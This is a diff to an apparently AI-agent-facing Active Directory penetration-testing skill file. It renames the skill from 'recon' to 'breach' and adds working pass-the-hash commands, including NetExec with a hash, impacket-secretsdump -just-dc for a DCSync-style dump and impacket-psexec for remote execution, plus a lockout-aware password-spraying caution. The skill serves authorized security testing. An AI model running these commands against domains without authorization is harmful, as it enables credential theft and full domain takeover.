@@ -1,5 +1,5 @@
 ---
-name: ad-recon
+name: ad-breach
 description: Full Active Directory attack-path enumeration and exploitation methodology on Linux: comprehensive LDAP/SMB/RPC enumeration from zero-creds to Domain Admin, BloodHound attack-graph analysis, Kerberos weaknesses (AS-REP roasting, Kerberoasting, resource-based constrained delegation abuse), GenericAll/ACL exploitation chains, credential harvesting (DCSync, LAPS, GPP), AD CS attacks (ESC1-ESC8), NTLM relay and coercion (PetitPotam/PrinterBug), and persistence detection. Every finding tagged to MITRE ATT&CK. Structured Markdown report output.
 license: MIT
 metadata:
@@ -8,7 +8,7 @@ metadata:
   tags: ["active-directory", "ad", "kerberos", "bloodhound", "internal-pentest", "privilege-escalation", "lateral-movement", "dcsync", "acl-abuse"]
 ---
 
-# AD Recon: Active Directory Attack Path Enumeration & Exploitation
+# AD Breach: Active Directory Attack Path Enumeration & Exploitation
 
 A structured, **iterative methodology** for enumerating, analyzing, and compromising Active Directory environments from Linux. Starts from zero credentials and escalates to full domain compromise through enumeration, vulnerability discovery, and **multi-stage exploitation chains**. Every phase feeds into the next; each credential unlock cascades into deeper access.
 
@@ -48,7 +48,7 @@ go install github.com/ropnop/kerbrute@latest
 git clone https://github.com/cddmp/enum4linux-ng /opt/enum4linux-ng
 ```
 
-Inform the user of any tools that could not be installed and note which phases will be skipped or degraded. **Critical for AD recon**: having `nxc` + `bloodhound-python` + `impacket` is the minimum viable toolkit; everything else is force-multiplier bonus.
+Inform the user of any tools that could not be installed and note which phases will be skipped or degraded. **Critical for AD breach**: having `nxc` + `bloodhound-python` + `impacket` is the minimum viable toolkit; everything else is force-multiplier bonus.
 
 ---
 
@@ -61,7 +61,7 @@ NETBIOS="<DOMAIN>"             # NetBIOS name, from SMB banner if not known
 USER=""                        # username, blank if fully unauthenticated
 PASS=""                        # password, leave blank if none
 HASH=""                        # NTLM hash for pass-the-hash, format :NT or LM:NT
-WORKDIR="/tmp/ad-recon/$DOMAIN"
+WORKDIR="/tmp/ad-breach/$DOMAIN"
 mkdir -p "$WORKDIR"/{loot,bloodhound,tickets,secrets,relay}
 
 echo "Target DC: $DC_IP | Domain: $DOMAIN | Auth: ${USER:-anonymous}"
@@ -125,7 +125,7 @@ for rid in $(seq 500 1200); do
 done
 ```
 
-Every valid username here feeds **Phase 3 (AS-REP roasting)**: no password required, just a valid username.
+Every valid username here feeds **Phase 3 (AS-REP roasting)**: no password required, just a valid username. AS-REP roasting needs zero credentials, so it is valid to run Phase 3.1 immediately against this list rather than waiting for the phases in between; the ordering below groups commands by attack category, not by strict execution order.
 
 ### 0.4 Password policy & lockout threshold
 
@@ -159,6 +159,17 @@ nxc smb "$DC_IP" -u "$USER" -p "$PASS" 2>&1 | tee "$WORKDIR/loot/nxc-smb-auth.tx
 ```
 
 If output contains `(Pwn3d!)`, this account is a local admin on the DC: **jump directly to Phase 5 for credential dumping.**
+
+If you obtained an NTLM hash instead of a plaintext password (from Phase 3 cracking, Phase 5 secretsdump, or an existing engagement note), authenticate with `$HASH` instead of `$PASS` wherever the tooling supports it: pass the hash, don't crack it back to plaintext.
+
+```bash
+# NetExec: pass the hash
+nxc smb "$DC_IP" -u "$USER" -H "$HASH" 2>&1 | tee "$WORKDIR/loot/nxc-smb-pth.txt"
+
+# Impacket tools take the hash via -hashes LM:NT (use a blank LM half if only NT is known)
+impacket-secretsdump "$DOMAIN/$USER"@"$DC_IP" -hashes "$HASH" -just-dc
+impacket-psexec.py -hashes "$HASH" "$DOMAIN/$USER"@"$DC_IP"
+```
 
 ### 1.2 Full LDAP enumeration via NetExec
 
@@ -412,6 +423,8 @@ impacket-secretsdump "$DOMAIN/$USER:$PASS@$TARGET_HOST" -outputfile "$WORKDIR/se
 
 ### 5.5 Password spraying (low-noise, requires lockout threshold awareness)
 
+Before running this, re-read `$WORKDIR/loot/pass-policy.txt` from Phase 0.4. If `lockoutThreshold` is nonzero, spray at most `lockoutThreshold - 1` guesses per account inside one `lockOutObservationWindow`, and confirm this is within rules of engagement first.
+
 ```bash
 # Test ONE password against all users (lowest noise)
 nxc smb "$DC_IP" -u "$WORKDIR/loot/valid-users.txt" -p 'Winter2024!' --continue-on-success 2>&1 | tee "$WORKDIR/loot/spray-results.txt"
@@ -510,7 +523,7 @@ ldapsearch -x -H "ldap://$DC_IP" -D "$USER@$DOMAIN" -w "$PASS" -b "CN=krbtgt,CN=
 Produce the following report, filling every section with findings from Phases 0-8:
 
 ```markdown
-# AD Recon Report
+# AD Breach Report
 
 **Domain:** `<domain.local>` (NetBIOS: `<DOMAIN>`)
 **Domain Controller:** `<hostname>` (`<IP>`): `<OS build>`
